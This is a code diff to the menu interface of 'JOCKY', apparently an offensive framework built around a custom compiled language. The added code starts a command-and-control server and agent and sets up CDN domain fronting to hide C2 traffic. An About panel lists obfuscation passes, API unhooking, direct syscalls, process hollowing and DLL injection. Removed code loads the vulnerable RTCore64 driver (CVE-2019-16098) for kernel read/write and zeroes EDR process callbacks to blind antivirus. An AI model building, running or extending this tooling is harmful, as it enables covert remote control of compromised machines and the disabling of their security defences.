+                       "Connect as Agent to server",
+                       "Domain Fronting config + test",
+                       "Show C2 architecture info"],
+                      "Command-and-control: server, agent, CDN fronting")
+        if choice == "0":
+            return
+
+        if choice == "1":
+            clear()
+            print_section("C2 Server")
+            host = get_input("Bind address", "0.0.0.0")
+            port = get_input("Port", "4444")
+            cprint(f"\n  [cyan]Starting C2 server on {host}:{port}[/cyan]")
+            cprint("  [dim]Type 'list', 'exec <sid> <code>', 'execall <code>', 'quit'[/dim]\n")
+            try:
+                import asyncio
+                from c2.server import C2Server
+                async def _run():
+                    srv = C2Server(host, int(port))
+                    await srv.start()
+                    await srv.interactive_loop()
+                asyncio.run(_run())
+            except ImportError as e:
+                cprint(f"  [red]{e}[/red]")
+            except KeyboardInterrupt:
+                cprint("\n  [yellow]Server stopped[/yellow]")
+            pause()
+
+        elif choice == "2":
+            clear()
+            print_section("C2 Agent")
+            host = get_input("Server address", "127.0.0.1")
+            port = get_input("Port", "4444")
+            tls  = get_input("Use TLS? (y/n)", "n").lower() == "y"
+            cprint(f"\n  [cyan]Connecting to {host}:{port} …[/cyan]")
+            try:
+                import asyncio
+                from c2.agent import C2Agent
+                agent = C2Agent(host, int(port), tls=tls, reconnect=False)
+                asyncio.run(agent.run())
+            except ImportError as e:
+                cprint(f"  [red]{e}[/red]")
+            except KeyboardInterrupt:
+                pass
+            pause()
+
+        elif choice == "3":
+            clear()
+            print_section("Domain Fronting")
+            rprint("  [bold]Domain fronting routes C2 traffic through CDN infrastructure.[/bold]")
+            rprint("  [dim]Network sees: <CDN front domain> (legitimate)")
+            rprint("  HTTP Host header: <real C2 host> (encrypted in TLS)[/dim]\n")
+            c2_host = get_input("Real C2 host (Host: header)")
+            cdn     = get_input("CDN front domain (SNI/TCP, e.g. *.cloudfront.net)")
+            path    = get_input("HTTP path", "/jocky")
+            proxy   = get_input("SOCKS5 proxy (host:port, blank=none)", "")
+            if not c2_host:
+                pause()
+                continue
+            proxy_host, proxy_port = None, 1080
+            if proxy:
+                parts = proxy.rsplit(":", 1)
+                proxy_host = parts[0]
+                proxy_port = int(parts[1]) if len(parts) > 1 else 1080
+
+            cprint(f"\n  [cyan]Config:[/cyan]")
+            rprint(f"    C2 host  : [white]{c2_host}[/white]")
+            rprint(f"    CDN front: [white]{cdn or c2_host}[/white]")
+            rprint(f"    Path     : [white]{path}[/white]")
+            rprint(f"    SOCKS5   : [white]{proxy or 'none'}[/white]")
+            cprint("\n  [dim]Use fronting.FrontedTransport in your agent for actual traffic.[/dim]")
+            pause()
+
+        elif choice == "4":
+            clear()
+            print_section("C2 Architecture")
+            rprint("""
+  [bold cyan]JOCKY C2 Architecture[/bold cyan]
+
+  [yellow]Server (c2/server.py)[/yellow]
+    • Asyncio TCP listener (supports TLS)
+    • Multi-agent sessions — each agent gets a unique SID
+    • Management shell: list, exec, execall
+    • Dispatches JOCKY scripts to agents for remote execution
+
+  [yellow]Agent (c2/agent.py)[/yellow]
+    • Connects to server, auto-reconnects on drop
+    • Heartbeat ping every 30s
+    • Executes .jk scripts or raw JOCKY code on command
+    • Reports output back to server
+
+  [yellow]Domain Fronting (c2/fronting.py)[/yellow]
+    • HTTP POST/GET with spoofed Host: header
+    • TLS SNI = CDN front domain (what the network sees)
+    • HTTP Host = real C2 hostname (inside encrypted TLS)
+    • Optional SOCKS5 proxy for double-hop routing
+    • FrontedBeacon for periodic polling C2
+
+  [yellow]CDN Fronting Examples[/yellow]
+    • AWS CloudFront: *.cloudfront.net → custom origin
+    • Azure CDN: *.azureedge.net      → custom origin
+    • Fastly: *.fastly.net            → backend host
+""")
+            pause()
+
+# ── Language Reference ────────────────────────────────────────────────────────
+
+def menu_langref() -> None:
+    ref = """
+JOCKY Language Reference
+─────────────────────────
+
+Types:     int, string, bool, proc, conn, mem
+Literals:  42  "hello"  true  false  0xDEADBEEF
+
+Functions:
+  func start() { ... }          Entry point
+  func name(param: type) { ... }
+
+Variables:
+  let x: int = 42;
+  let s: string = "hello";
+
+Control flow:
+  if (cond) { ... } else { ... }
+  for (let i: int = 0; i < n; i++) { ... }
+  while (cond) { ... }
+
+Operators:  + - * / % == != < > <= >= && || !
+
+Stdlib — Output:
+  report(s: string)
+
+Stdlib — Processes:
+  procs_list() -> proc
+  proc_count(p: proc) -> int
+  proc_name(p: proc, i: int) -> string
+  proc_pid(p: proc, i: int) -> int
+  proc_kill(pid: int)
+
+Stdlib — Network:
+  conns_list() -> conn
+  conn_count(c: conn) -> int
+  conn_local(c: conn, i: int) -> string
+  conn_remote(c: conn, i: int) -> string
+  conn_pid(c: conn, i: int) -> int
+
+Stdlib — BYOVD / Kernel:
+  byovd_scan() -> mem        Scan drivers (SHA-256 + filename)
+  byovd_count(m: mem) -> int
+  byovd_name(m: mem, i: int) -> string
+  byovd_cve(m: mem, i: int) -> string
+  byovd_hash(m: mem, i: int) -> string
+  kernel_base() -> int
+  registry_scan() -> mem
+  reg_count(m: mem) -> int
+  reg_name(m: mem, i: int) -> string
+
+Stdlib — System:
+  system_info() -> string
+
+Example:
+  func start() {
+      let p: proc = procs_list();
+      let n: int = proc_count(p);
+      for (let i: int = 0; i < n; i++) {
+          report(proc_name(p, i));
+      }
+  }
+
+Full docs: docs/jockydocumentation.md
+"""
     clear()
-    print_header("BYOVD Driver Scan", "Checking system against LOLDrivers database")
-
-    rprint("\n  [dim]Enumerating system drivers via Windows registry...[/dim]")
-    rprint("  [dim]Cross-referencing against known-vulnerable driver DB...[/dim]\n")
-
-    scanner = BYOVDScanner()
-    results = scanner.scan()
-
-    total = results["total_drivers"]
-    vuln  = results["vulnerable_count"]
-    crit  = results["critical_count"]
-    high  = results["high_count"]
-
+    print_header("JOCKY Language Reference")
     if RICH:
-        stats = Table(box=box.SIMPLE, show_header=False)
-        stats.add_column(style="dim")
-        stats.add_column(style="bold")
-        stats.add_row("Drivers scanned:",    str(total))
-        stats.add_row("Vulnerable found:",   f"[{'red' if vuln > 0 else 'green'}]{vuln}[/]")
-        stats.add_row("  Critical:",         f"[red]{crit}[/red]")
-        stats.add_row("  High:",             f"[yellow]{high}[/yellow]")
-        stats.add_row("DB entries:",         str(scanner.db_size()))
-        console.print(stats)
-    else:
-        print(f"  Drivers scanned:   {total}")
-        print(f"  Vulnerable found:  {vuln}")
-        print(f"    Critical:        {crit}")
-        print(f"    High:            {high}")
-
-    vuln_list = results["vulnerable_drivers"]
-    if not vuln_list:
-        rprint("\n  [green][OK] No known-vulnerable drivers found on this system.[/green]")
-    else:
-        rprint(f"\n  [red][!] {len(vuln_list)} vulnerable driver(s) detected:[/red]\n")
-        if RICH:
-            tbl = Table(box=box.SIMPLE_HEAVY, border_style="red",
-                        header_style="bold red")
-            tbl.add_column("Risk",    width=10)
-            tbl.add_column("Driver",  style="bold")
-            tbl.add_column("CVE",     style="yellow")
-            tbl.add_column("Vendor",  style="dim")
-            tbl.add_column("Path",    style="dim", max_width=40)
-            for d in vuln_list:
-                risk_style = "red" if d.risk_level() == "CRITICAL" else "yellow"
-                tbl.add_row(
-                    f"[{risk_style}]{d.risk_level()}[/{risk_style}]",
-                    d.filename,
-                    d.cve or "N/A",
-                    d.vendor or "?",
-                    d.full_path,
-                )
-            console.print(tbl)
-            for d in vuln_list:
-                if d.description:
-                    console.print(f"\n  [bold]{d.filename}[/bold]: {d.description[:100]}")
-        else:
-            for d in vuln_list:
-                print(f"\n  [{d.risk_level()}] {d.filename}")
-                print(f"    CVE:    {d.cve or 'N/A'}")
-                print(f"    Vendor: {d.vendor or '?'}")
-                print(f"    Path:   {d.full_path}")
-    pause()
-
-
-def _byovd_db_display():
-    """Show the bundled LOLDrivers database."""
-    clear()
-    print_header("LOLDrivers Database", "Known-vulnerable Windows drivers")
-    try:
-        import json
-        db_path = APP_DIR / "byovd" / "db" / "loldrivers.json"
-        entries = json.loads(db_path.read_text(encoding="utf-8"))
-    except Exception as e:
-        rprint(f"[red]  Failed to load DB: {e}[/red]")
-        pause()
-        return
-
-    rprint(f"\n  [dim]{len(entries)} entries in bundled database[/dim]\n")
-
-    if RICH:
-        tbl = Table(box=box.SIMPLE_HEAVY, border_style="yellow",
-                    header_style="bold yellow")
-        tbl.add_column("Driver",     style="bold", width=22)
-        tbl.add_column("Vendor",     style="dim",  width=16)
-        tbl.add_column("CVE",        style="yellow", width=18)
-        tbl.add_column("Device",     style="dim",  width=20)
-        tbl.add_column("Tags",       style="cyan")
-        for e in entries:
-            tags = ", ".join(e.get("Tags", [])[:3])
-            is_danger = any(t in e.get("Tags", [])
-                            for t in ("EDR-Bypass", "AV-Kill", "Ransomware"))
-            name_style = "red" if is_danger else "bold"
-            tbl.add_row(
-                f"[{name_style}]{e.get('Name','?')}[/{name_style}]",
-                e.get("Vendor", "?"),
-                e.get("CVE", "N/A"),
-                e.get("DeviceName", "")[:20],
-                tags,
-            )
-        console.print(tbl)
-    else:
-        print(f"  {'Driver':<26} {'CVE':<20} {'Tags'}")
-        print("  " + "─" * 70)
-        for e in entries:
-            print(f"  {e.get('Name','?'):<26} {e.get('CVE','N/A'):<20} "
-                  f"{', '.join(e.get('Tags',[])[:2])}")
-    pause()
-
-
-def _byovd_kernel_demo(DriverLoader, KernelOps):
-    """Interactive kernel operations demo."""
-    clear()
-    print_header("Kernel Operations Demo",
-                 "RTCore64 IOCTL: read/write/callback enumeration")
-
-    is_admin = DriverLoader.check_privileges()
-    simulate = not is_admin
-
-    if RICH:
-        mode_str = ("[yellow]Simulation mode[/yellow] (not admin)"
-                    if simulate else
-                    "[green]Real mode[/green] (admin)")
-        console.print(f"\n  [cyan]Mode:[/cyan] {mode_str}\n")
-
-    loader = DriverLoader(simulate=simulate)
-    kops   = KernelOps(loader)
-
-    print_section("[1] ntoskrnl.exe Base Address")
-    base = kops.get_kernel_base()
-    rprint(f"  ntoskrnl base: [yellow]0x{base:016X}[/yellow]")
-
-    print_section("[2] PsCreateProcessNotifyRoutine Callbacks")
-    cbs = kops.enum_process_callbacks(base)
-    if RICH:
-        tbl = Table(box=box.SIMPLE, header_style="bold")
-        tbl.add_column("#",      width=4)
-        tbl.add_column("Owner",  width=10)
-        tbl.add_column("Address",style="yellow", width=20)
-        tbl.add_column("Module", style="cyan")
-        for i, cb in enumerate(cbs):
-            owner = "[green]MS[/green]" if cb["is_microsoft"] else "[red]EDR[/red]"
-            tbl.add_row(str(i), owner,
-                        f"0x{cb['address']:016X}", cb["module"])
-        console.print(tbl)
-    else:
-        for i, cb in enumerate(cbs):
-            tag = "[MS]" if cb["is_microsoft"] else "[EDR]"
-            print(f"  {tag} [{i}] 0x{cb['address']:016X}  {cb['module']}")
-
-    print_section("[3] Kernel Memory Read Demo")
-    val = kops.read_dword(base)
-    rprint(f"  READ  0x{base:016X}  → [yellow]0x{val:08X}[/yellow]")
-    kops.write_dword(base, 0)
-
-    non_ms = [c for c in cbs if not c["is_microsoft"]]
-    if non_ms:
-        rprint(f"\n  [red][!] {len(non_ms)} non-Microsoft callback(s) detected.[/red]")
-        rprint("  [dim]Use 'EDR Blind Demo' to patch them.[/dim]")
-    else:
-        rprint("\n  [green][OK] No non-Microsoft callbacks found.[/green]")
-    pause()
-
-
-def _byovd_blind_edr(DriverLoader, KernelOps):
-    """Demonstrate patching non-Microsoft EDR callbacks."""
-    clear()
-    print_header("EDR Callback Blind",
-                 "Patch PsCreateProcessNotifyRoutine — remove EDR visibility")
-
-    is_admin = DriverLoader.check_privileges()
-    simulate = not is_admin
-
-    if RICH:
-        mode_str = ("[yellow]Simulation mode[/yellow] — no actual kernel writes"
-                    if simulate else
-                    "[red]REAL mode[/red] — will write to kernel memory")
-        console.print(f"\n  [cyan]Mode:[/cyan] {mode_str}")
-        if simulate:
-            console.print("  [dim]For real execution: run as Administrator in a VM "
-                          "with the driver loaded.[/dim]\n")
-        else:
-            console.print("  [red][!] Admin detected — this will make real kernel writes.[/red]\n")
-
-    loader = DriverLoader(simulate=simulate)
-    kops   = KernelOps(loader)
-
-    rprint("  [dim]Enumerating callbacks...[/dim]\n")
-    cbs    = kops.enum_process_callbacks(0)
-    edr_cbs = [c for c in cbs if not c["is_microsoft"]]
-
-    if not edr_cbs:
-        rprint("  [green]No non-Microsoft callbacks found.[/green]")
-        pause()
-        return
-
-    rprint(f"  [red]{len(edr_cbs)} EDR callback(s) to patch:[/red]\n")
-    for i, cb in enumerate(edr_cbs):
-        rprint(f"  [{i}] [yellow]{cb['module']}[/yellow]  "
-               f"@ 0x{cb['address']:016X}")
-
-    rprint("\n  [bold]Patching...[/bold]")
-    n = kops.disable_non_microsoft_callbacks(0)
-    rprint(f"\n  [green]{n} callback(s) zeroed.[/green]")
-    if simulate:
-        rprint("  [dim](Simulation: in real mode, AV/EDR now blind to process creation.)[/dim]")
-    else:
-        rprint("  [red][!!] EDR/AV process-notify callbacks have been neutralised.[/red]")
-    pause()
-
-
-def _byovd_load_driver(DriverLoader, KernelOps):
-    """Interactive driver load flow."""
-    clear()
-    print_header("Load Vulnerable Driver",
-                 "RTCore64 / CVE-2019-16098 — BYOVD Driver Loader")
-
-    is_admin = DriverLoader.check_privileges()
-
-    if RICH:
-        if is_admin:
-            console.print("\n  [green][OK] Running as Administrator.[/green]")
-        else:
-            console.print("\n  [yellow][!] Not Administrator — simulation mode will be used.[/yellow]")
-            console.print("  [dim]To actually load a driver: right-click → Run as Administrator[/dim]\n")
-
-    rprint("  [dim]Default target: RTCore64.sys (ASUS ROG, CVE-2019-16098)[/dim]")
-    rprint("  [dim]Provides arbitrary kernel read/write via IOCTL.[/dim]\n")
-
-    driver_path = ask("Driver path (.sys) or Enter to simulate")
-    if not driver_path.strip():
-        driver_path = None
-        use_sim = True
-    else:
-        use_sim = not is_admin
-
-    loader = DriverLoader(driver_path=driver_path or "RTCore64.sys", simulate=use_sim)
-
-    try:
-        rprint("\n  [dim]Loading driver...[/dim]")
-        ok = loader.load()
-        if ok:
-            loader.open_device()
-            rprint("  [green][+] Driver loaded — device handle open.[/green]")
-            rprint("  [green][+] Kernel access active.[/green]\n")
-
-            kops = KernelOps(loader)
-            base = kops.get_kernel_base()
-            rprint(f"  [cyan]ntoskrnl base:[/cyan] [yellow]0x{base:016X}[/yellow]")
-
-            val = kops.read_dword(base)
-            rprint(f"  [cyan]kernel_read @ base:[/cyan] [yellow]0x{val:08X}[/yellow]")
-        else:
-            rprint("  [red][-] Load failed.[/red]")
-    except Exception as e:
-        rprint(f"  [red]Error: {e}[/red]")
-    finally:
-        loader.unload()
-        rprint("\n  [dim]Driver unloaded.[/dim]")
-
-    pause()
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: Language Reference
-# ─────────────────────────────────────────────────────────────────────────────
-
-def menu_language_ref():
-    clear()
-    print_header("JOCKY Language Reference", "Syntax · Types · Stdlib Functions")
-
-    ref = textwrap.dedent("""
-    ┌─ Types ──────────────────────────────────────────────────────────────────
-    │  num     64-bit integer         var x : num  := 42
-    │  dec     64-bit float           var f : dec  := 3.14
-    │  text    string (backtick)      var s : text := `hello`
-    │  flag    boolean                var b : flag := yes  |  no
-    │  raw     opaque pointer         var p : raw  := procs_list()
-    │  nothing void (return only)
-    │
-    ├─ Declarations ──────────────────────────────────────────────────────────
-    │  var name : type := expr        Declare + initialise (required)
-    │  name <- expr                   Reassign existing variable
-    │
-    ├─ Control Flow ──────────────────────────────────────────────────────────
-    │  check (cond) { ... }           if
-    │  check (cond) { ... }
-    │    otherwise { ... }            if-else
-    │  loop (cond) { ... }            while loop
-    │  stop                           break out of loop
-    │  skip                           continue to next iteration
-    │  give value                     return a value
-    │  give                           void return
-    │
-    ├─ Functions ─────────────────────────────────────────────────────────────
-    │  func name(param : type) -> return_type {
-    │      body
-    │  }
-    │  Entry point: func start() -> nothing { ... }
-    │
-    ├─ Operators ─────────────────────────────────────────────────────────────
-    │  +  -  *  /  mod               Arithmetic
-    │  is  isnt  gt  lt  gte  lte    Comparison  → flag
-    │  also  or  flip                Logical AND / OR / NOT
-    │  := (initialise)   <- (assign)
-    │
-    ├─ Comments ──────────────────────────────────────────────────────────────
-    │  ## single-line only
-    │
-    └─ Standard Library ──────────────────────────────────────────────────────
-       report(msg : text)              Print with [JOCKY] prefix
-       procs_list()      → raw         Get running process list
-       proc_count(p)     → num         Count processes
-       proc_name(p, i)   → text        Process name at index
-       proc_pid(p, i)    → num         Process PID at index
-       proc_kill(pid)                  Terminate process
-       net_conns()       → raw         Active TCP/UDP connections
-       net_sniff(ms)     → raw         Passive packet capture (ms duration)
-       reg_read(k, v)    → text        Read Windows registry value
-       reg_list(k)       → raw         List registry subkeys
-       file_list(path)   → raw         List directory entries
-       file_read(path)   → raw         Read file bytes
-       sys_info()        → raw         System info handle
-       hash_file(path)   → raw         SHA-256 hash of file
-
-    ┌─ BYOVD / Kernel Functions (--kernel mode) ──────────────────────────────
-    │  byovd_scan()              → raw   Scan for vulnerable drivers
-    │  byovd_driver_count(r)     → num   Number found
-    │  byovd_driver_name(r,i)    → text  Driver filename
-    │  byovd_driver_path(r,i)    → text  Full path on disk
-    │  byovd_driver_cve(r,i)     → text  CVE identifier
-    │  byovd_driver_risk(r,i)    → text  CRITICAL / HIGH / MEDIUM
-    │  byovd_load(path)          → flag  Load vulnerable driver (Admin)
-    │  byovd_unload()                    Unload and delete service
-    │  kernel_base()             → num   ntoskrnl.exe load address
-    │  kernel_read(addr, size)   → raw   Read kernel virtual memory
-    │  kernel_write(addr, val)           Write DWORD to kernel memory
-    │  kernel_enum_callbacks()   → raw   Enumerate EDR notify-callbacks
-    │  kernel_callback_count(c)  → num   Callback count
-    │  kernel_callback_addr(c,i) → num   Callback function pointer
-    │  kernel_callback_module(c,i)→text  Owner module name
-    │  kernel_patch_callback(i)  → flag  Zero out callback entry
-    └─ kernel_blind_edr()        → num   Patch all non-MS callbacks
-    """)
-
-    if RICH:
-        console.print(Panel(ref, border_style="cyan",
-                            title="[cyan]JOCKY Language Reference[/cyan]"))
+        console.print(Panel(ref.strip(), border_style="dim"))
     else:
         print(ref)
     pause()
 
+# ── About ─────────────────────────────────────────────────────────────────────
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Menu: About
-# ─────────────────────────────────────────────────────────────────────────────
-
-def menu_about():
+def menu_about() -> None:
     clear()
-    print_header("About JOCKY", "Compiled Security-Focused Language")
+    print_header("JOCKY Framework", "Advanced Kernel Security Research Platform")
+    rprint("""
+  [bold cyan]Components[/bold cyan]
 
-    about = textwrap.dedent("""
-    JOCKY is a compiled, statically-typed language designed for
-    Windows forensics and cybersecurity tooling.
+  [yellow]Language Compiler[/yellow]
+    Custom compiled language (.jk → LLVM IR → native exe / JIT)
+    4 obfuscation passes: build-ID, XOR strings, entropy, dead code
+    Import table variation: every binary has a different import hash
 
-    Key Properties
-    ──────────────
-    • Custom syntax — AV parsers cannot execute .jk source files
-    • XOR-encrypted strings — static analysis can't read literals
-    • Polymorphic builds — different SHA-256 hash on every compile
-    • Native .exe via LLVM + MinGW gcc (no Python at runtime)
-    • JIT execution for rapid testing via LLVM MCJIT engine
+  [yellow]BYOVD Engine[/yellow]
+    Vulnerable driver loader (RTCore64, CVE-2019-16098)
+    Kernel base resolution (raw NtQuerySystemInformation + psapi fallback)
+    Callback enumeration (PspCreateProcessNotifyRoutine PE scan)
+    Kernel r/w (RTCore64 IOCTL 0x80002048 / 0x8000204C)
+    LOLDrivers DB: 40+ entries with SHA-256 cross-reference
 
-    Technology Stack
-    ────────────────
-    • Python 3.10+  (compiler toolchain only)
-    • llvmlite      — Python bindings to LLVM IR builder + JIT
-    • MinGW gcc     — Windows native binary linker
+  [yellow]Evasion Engine[/yellow]
+    API unhooking (detect/restore EDR hooks in ntdll.dll)
+    Direct syscalls (SSN extraction, bypass ntdll hooks)
+    Process hollowing (NtUnmapViewOfSection + PE remap)
+    DLL injection (LoadLibraryW + reflective loader)
+    Thread hijacking (SuspendThread + RIP redirect)
 
-    Compilation Pipeline
-    ────────────────────
-    .jk source
-      1. Lexer      → token stream
-      2. Parser     → Abstract Syntax Tree
-      3. Semantic   → type-checked AST
-      4. Codegen    → LLVM IR module
-      5. Obfuscate  → XOR strings + random build-ID + entropy
-           ↓
-      JIT:    run via MCJIT with Python stdlib callbacks
-      Native: gcc links .o + forensics.o → standalone .exe
+  [yellow]C2 Framework[/yellow]
+    Asyncio multi-agent C2 server + agent
+    Domain fronting (spoofed Host: header through CDN)
+    SOCKS5 proxy routing
+    Periodic beacon with command dispatch
 
-    Built for Smart India Hackathon (SIH)
-    """)
+  [yellow]Cross-Platform[/yellow]
+    Windows 10/11 (primary), Linux (forensics.c + stdlib.py)
+    /proc/modules, /proc/net/tcp, /proc/<pid>/comm on Linux
 
-    if RICH:
-        console.print(Panel(about, border_style="cyan",
-                            title="[cyan]About JOCKY[/cyan]"))
-    else:
-        print(about)
+  [bold dim]Docs: docs/jockydocumentation.md | docs/systemarchitecture.md[/bold dim]
+""")
     pause()
 
+# ── Main menu ─────────────────────────────────────────────────────────────────
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Main menu
-# ─────────────────────────────────────────────────────────────────────────────
+MAIN_MENU = [
+    "[bold]Pre-built Scripts[/bold]              [dim]Run built-in .jk recon/exploit scripts[/dim]",
+    "[bold]Custom Code Editor[/bold]             [dim]Write and run JOCKY code interactively[/dim]",
+    "[bold]Pipeline Inspector[/bold]             [dim]Inspect tokens / AST / IR / semantic[/dim]",
+    "[bold]Build[/bold]                          [dim]Compile .jk to native .exe[/dim]",
+    "[bold]BYOVD Engine[/bold]                   [dim]Driver scan, kernel r/w, callback enum[/dim]",
+    "[bold]Evasion Engine[/bold]                 [dim]API unhook, syscalls, hollowing, injection[/dim]",
+    "[bold]C2 Management[/bold]                  [dim]Server, agent, domain fronting, SOCKS5[/dim]",
+    "[bold]Language Reference[/bold]             [dim]JOCKY syntax and stdlib quick-ref[/dim]",
+    "[bold]About[/bold]                          [dim]Framework overview[/dim]",
+]
 
-def main_menu():
+PLATFORM_INFO = f"{platform.system()} {platform.release()} | Python {platform.python_version()}"
+
+def main() -> None:
+    handlers = [
+        menu_scripts,
+        menu_editor,
+        menu_inspector,
+        menu_build,
+        menu_byovd,
+        menu_evasion,
+        menu_c2,
+        menu_langref,
+        menu_about,
+    ]
+
     while True:
-        clear()
-
-        if RICH:
-            banner = Text.from_markup(
-                "[bold cyan]   ██╗ ██████╗  ██████╗██╗  ██╗██╗   ██╗[/bold cyan]\n"
-                "[bold cyan]   ██║██╔═══██╗██╔════╝██║ ██╔╝╚██╗ ██╔╝[/bold cyan]\n"
-                "[bold cyan]   ██║██║   ██║██║     █████╔╝  ╚████╔╝ [/bold cyan]\n"
-                "[bold cyan]██ ██║██║   ██║██║     ██╔═██╗   ╚██╔╝  [/bold cyan]\n"
-                "[bold cyan]╚█████╔╝╚██████╔╝╚██████╗██║  ██╗  ██║  [/bold cyan]\n"
-                "[bold cyan] ╚════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝  ╚═╝  [/bold cyan]\n"
-                "\n"
-                "[dim]  Compiled Security Language  ·  Cybersecurity Terminal[/dim]\n"
-                "[dim]  LLVM Backend  ·  JIT + Native Binary  ·  AV Evasion Demo[/dim]"
-            )
-            console.print(Panel(Align.center(banner), border_style="cyan", padding=(0, 4)))
-        else:
-            print("\n" + "=" * 62)
-            print("  J O C K Y   Terminal")
-            print("  Compiled Security Language")
-            print("=" * 62)
-
-        _divider()
-        rprint("  [bold yellow]Main Menu[/bold yellow]")
-        _item(1, "Pre-built Cybersecurity Scripts",
-              "9 forensics scripts — process/net/registry/threat")
-        _item(2, "Write / Edit Custom Script",
-              "workspace editor + run/inspect/build")
-        _item(3, "Inspect Script        (Tokens · AST · IR)")
-        _item(4, "Build Native Binary   (.exe)")
-        _item(5, "BYOVD Engine",
-              "scan drivers · kernel ops · EDR blind · RTCore64 PoC")
-        _item(6, "Language Reference")
-        _item(7, "About JOCKY")
-        _divider()
-        _item(0, "Exit")
-
-        choice = ask("Choice")
-
-        if choice == "1":
-            menu_prebuilt_scripts()
-        elif choice == "2":
-            menu_custom_script()
-        elif choice == "3":
-            menu_inspect()
-        elif choice == "4":
-            menu_build()
-        elif choice == "5":
-            menu_byovd()
-        elif choice == "6":
-            menu_language_ref()
-        elif choice == "7":
-            menu_about()
-        elif choice == "0":
+        choice = menu("JOCKY Framework", MAIN_MENU,
+                      f"Kernel Security Research Platform | {PLATFORM_INFO}")
+        if choice == "0":
             clear()
-            rprint("[cyan]Goodbye![/cyan]")
+            cprint("  [dim]Exiting JOCKY Framework.[/dim]")
             sys.exit(0)
+        try:
+            idx = int(choice) - 1
+            if 0 <= idx < len(handlers):
+                handlers[idx]()
+        except (ValueError, IndexError):
+            pass
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Entry point
-# ─────────────────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
-    if not RICH:
-        print("TIP: Install 'rich' for a better UI:  pip install rich")
-        print()
-    main_menu()
+    main()
